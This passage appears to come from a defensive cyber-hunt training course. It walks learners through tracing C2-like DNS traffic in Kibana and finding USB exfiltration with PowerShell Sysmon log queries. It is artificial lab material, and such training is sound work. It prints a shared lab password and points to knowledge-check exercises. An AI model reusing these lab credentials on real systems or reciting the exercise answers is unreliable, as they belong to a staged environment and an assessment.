![image](https://github.com/user-attachments/assets/5306551e-b29b-4df3-99ab-11c3dff92530)


After selecting this spike, the Discover page displays a graph similar to Figure 10.3-26, below. Use this information to answer the next series of Knowledge Checks.


![image](https://github.com/user-attachments/assets/c1f715d2-306b-4f20-aa8a-84d9ab03981d)

NOTE: The exact time increments may be slightly different on your machine, based on how precisely the DNS spike columns were selected.

![image](https://github.com/user-attachments/assets/5ea26e99-447b-40da-a467-152397247c0f)

![image](https://github.com/user-attachments/assets/8c367c62-74d4-4cf4-8157-5b568136cb5b)


-------------------------------

User on ch-tech-3
Below, Figure 10.3-28 displays that user account linwood.patterson was logged on during the timespan of the spike identified in the last workflow, 11:35:00.000 to 11:55.00.000. While a user may be logged in or active during a specific time frame, C2 traffic is not usually generated via interactive sessions, but by malware implanted on the host. It is best to investigate further both the account and the host to assess how the C2 traffic was generated. 

![image](https://github.com/user-attachments/assets/203f6216-2155-4bff-8d6b-8e96a9bc21d4)

![image](https://github.com/user-attachments/assets/d62a8d7a-9173-40f3-8279-06ef7cd0731b)

----------------------

#### CDAH-M10L4-Physical and Rogue Device Exfiltration ####

Identifying a Malicious Storage Device
Identify the Malicious Storage Devices
﻿

User Karen Smith (ksmith) reports that her device appears to have been logged into and used while she was out on her lunch break. The response team asks her how she secured her login credentials, so she shows them the sticky note that she keeps hidden under her keyboard. On the sticky note is her username and password. The event logs from her system, ch-edu-1, are forwarded to the response team and saved on the VM win-hunt. Examine the logs from her device to determine what may have occurred in her absence. Then, use any information found to determine if a malicious threat has acted elsewhere in the mission partner network.

﻿

Use Windows Event Logs to Determine Exfiltration
﻿

Use the PowerShell cmdlets for Windows Event Log inspection to determine if exfiltration occurred on this system. A Windows Event Log file (.extx extension) is located on the desktop of the compromised system for review.

﻿

This lab uses the following cmdlets.

Get-WinEvent -Path 'C:\Path\To\File.evtx' 

Gets the entire event log from the file. As explained in CDA Basic, the cmdlet Get-WinEventLog may be used for a variety of analytics, including a summary of the types of events in a log.

Group-Object -Property PropertyName 

Groups the events by specified property name.

Sort-Object -Property PropertyName 

Sorts the results by the values of a specified property.

Format-Table PropertyName1, PropertyName2

Formats the results to display the specified properties of the resulting data objects.


Workflow
﻿

1. Log into the VM win-hunt using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. Open a PowerShell terminal as the Administrator.

﻿

3. Summarize each Sysmon Event type by ID in the log file C:\Users\trainee\Desktop\sysmon_archive.evtx with the following command:

PS C:\Windows\system32> Get-WinEvent -Path 'C:\Users\trainee\Desktop\sysmon_archive.evtx' | Group-Object -Property ID -NoElement | Sort-Object -Property Count -Descending | Format-Table Name,Count
﻿

NOTE: This command takes about two minutes to complete.

﻿

Recall from earlier in this lesson that Sysmon records of FileCreate and RawAccessRead events are useful in detecting USB Removable Media exfiltration. Below, Figure 10.4-6 displays the output of completing the previous step. This output does not indicate any RawAccessRead events (Event ID 9). However, there are thousands of FileCreate events (Event ID 11).

![image](https://github.com/user-attachments/assets/2a0813de-7be0-483b-90f7-10e1feb743ff)


4. Determine whether any of the files were created or modified in a non-hard disk drive by executing the following command:
PS C:\Windows\system32> Get-WinEvent -Path 'C:\Users\trainee\Desktop\sysmon_archive.evtx' | Where-Object -Property ID -EQ 11 | Where-Object -Property Message -Match 'E:\\' | Format-List *



Figure 10.4-7 below displays the three files that were written to the E:\ drive, which is one of the USB drives on this system.

![image](https://github.com/user-attachments/assets/512f2dbe-75c5-459b-a848-03bb7f4a5349)


Complete the next series of steps to determine whether any other systems in the enterprise were compromised in the same way.


5. Open Chrome.


6. Open Kibana using the bookmark in Chrome. 


7. Enter the following credentials in Kibana:


Username: trainee@jdmss.lan
Password: CyberTraining1!



8. Use the Kibana Query Language (KQL) skills introduced in the previous lessons to find the Sysmon logs that indicate USB exfiltration across the enterprise. 
Use a time period that includes the host log entries analyzed in step 4.

![image](https://github.com/user-attachments/assets/bf5fea53-ec94-4b77-b478-de300faab5c4)

![image](https://github.com/user-attachments/assets/66088927-f4d7-4391-af40-4f1bf5bd1124)



---------------------------------------




















































































































































































































































